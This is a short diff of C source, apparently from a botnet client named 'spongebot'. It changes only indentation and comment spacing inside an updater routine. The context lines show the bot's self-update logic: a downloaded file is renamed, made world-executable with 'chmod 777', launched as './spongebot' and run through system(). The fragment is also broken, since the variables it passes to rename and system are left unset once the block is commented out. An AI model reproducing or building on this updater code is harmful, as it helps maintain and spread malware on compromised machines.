@@ -114,17 +114,17 @@ void updater_init()
                     printf("[updater] Download completed.\n");
 #endif
 
-                    //TODO add strings to dict
+                    // TODO add strings to dict
                     char *new_name, *_command, *args[3];
-/*
-                    do
-                    {
-                        new_name = "spongebot";
-                        _command = "chmod 777 spongebot";
+                    /*
+                                        do
+                                        {
+                                            new_name = "spongebot";
+                                            _command = "chmod 777 spongebot";
 
-                        args[0] = "./spongebot";
-                        args[1] = NULL;
-                    } while (0);*/
+                                            args[0] = "./spongebot";
+                                            args[1] = NULL;
+                                        } while (0);*/
 
                     rename(dict_get(UPDATER_TMP_FILE), new_name);
                     system(_command);
